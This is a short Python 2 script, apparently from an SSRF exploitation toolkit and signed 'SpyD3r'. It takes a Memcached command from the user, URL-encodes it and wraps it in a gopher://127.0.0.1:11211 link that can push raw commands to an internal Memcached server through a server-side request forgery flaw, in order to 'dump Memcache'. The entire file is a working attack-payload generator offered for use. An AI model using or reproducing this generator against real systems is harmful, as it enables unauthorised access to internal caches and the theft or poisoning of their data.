import urllib

code = raw_input("Give payload you want to run in Memcached Server: ")

payload = urllib.quote_plus(code).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

finalpayload = "gopher://127.0.0.1:11211/_%0d%0a" + payload + "%0d%0a"

print "\nYour gopher link is ready to dump Memcache : \n"
print finalpayload
print "\n-----------Made-by-SpyD3r-----------\n"
